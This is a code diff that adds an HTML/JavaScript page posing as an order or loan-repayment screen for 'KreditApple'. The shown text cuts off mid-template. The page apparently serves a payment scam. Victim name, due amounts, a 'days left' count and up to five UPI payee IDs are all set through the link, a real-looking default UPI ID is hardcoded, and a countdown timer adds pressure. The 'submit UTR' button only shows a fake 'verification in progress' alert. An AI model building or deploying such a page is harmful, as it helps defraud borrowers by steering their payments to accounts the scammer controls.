@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Order Details - KreditApple</title>
+<script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex justify-center items-center min-h-screen m-0">
+
+<div class="w-full max-w-md bg-white shadow-xl min-h-screen flex flex-col justify-between pb-6" id="app"></div>
+
+<script>
+const p = new URLSearchParams(window.location.search);
+const d = {
+  biz: p.get('b') || p.get('biz'),
+  logo: p.get('l') || p.get('logo') || 'K',
+  name: p.get('n') || p.get('name') || 'Customer',
+  mobile: p.get('m') || p.get('mobile') || '',
+  days: p.get('d') || p.get('days') || '0 Days left',
+  date: p.get('dt') || p.get('date') || '2026-11-20',
+  ext: p.get('e') || p.get('ext') || '2400',
+  full: p.get('f') || p.get('full') || '6000',
+  upi1: p.get('u1') || p.get('upi1') || 'bharatpe.90065511470@fbpe',
+  upi2: p.get('u2') || p.get('upi2') || '',
+  upi3: p.get('u3') || p.get('upi3') || '',
+  upi4: p.get('u4') || p.get('upi4') || '',
+  upi5: p.get('u5') || p.get('upi5') || ''
+};
+
+const app = document.getElementById('app');
+let sel = parseInt(p.get('ch') || '1');
+let page = p.get('page') || 'home';
+let mode = p.get('mode') || 'repay';
+let partAmt = 5000;
+let timerInterval = null;
+
+function getUpis(){
+  return [d.upi1||'', d.upi2||'', d.upi3||'', d.upi4||'', d.upi5||''];
+}
+
+function goPay(m, customAmt){
+  const u = new URL(window.location.href);
+  u.searchParams.set('page', 'pay');
+  u.searchParams.set('mode', m);
+  u.searchParams.set('ch', sel);
+  if(customAmt) {
+    u.searchParams.set('amt', customAmt);
+  } else {
+    u.searchParams.delete('amt');
+  }
+  window.location.href = u.toString();
+}
+
+function goHome(){
+  if(timerInterval) clearInterval(timerInterval);
+  const u = new URL(window.location.href);
+  u.searchParams.delete('page');
+  u.searchParams.delete('mode');
+  u.searchParams.delete('amt');
+  window.location.href = u.toString();
+}
+
+function startTimer(durationSeconds) {
+  if(timerInterval) clearInterval(timerInterval);
+  let timer = durationSeconds;
+  const display = document.getElementById('countdownTimer');
+  if(!display) return;
+
+  timerInterval = setInterval(function () {
+    let minutes = parseInt(timer / 60, 10);
+    let seconds = parseInt(timer % 60, 10);
+
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+    display.textContent = minutes + " : " + seconds;
+
+    if (--timer < 0) {
+      clearInterval(timerInterval);
+      display.textContent = "0 : 00";
+    }
+  }, 1000);
+}
+
+function copyUpiId(upiText, btnEl) {
+  navigator.clipboard.writeText(upiText);
+  const originalText = btnEl.innerText;
+  btnEl.innerText = 'COPIED';
+  btnEl.style.backgroundColor = '#16a34a';
+  setTimeout(() => {
+    btnEl.innerText = originalText;
+    btnEl.style.backgroundColor = '#3b82f6';
+  }, 2000);
+}
+
+function submitPayUtr() {
+  const utrVal = document.getElementById('payUtrInput').value.trim();
+  if(!utrVal || utrVal.length < 12) {
+    alert('Please enter a valid 12-digit UTR / Ref No.');
+    document.getElementById('payUtrInput').focus();
+    return;
+  }
+  alert('UTR (' + utrVal + ') submitted successfully! Verification in progress.');
+}
+
+function renderApp(){
+  if(!d.biz){
+    app.innerHTML = `
+      <div
+  
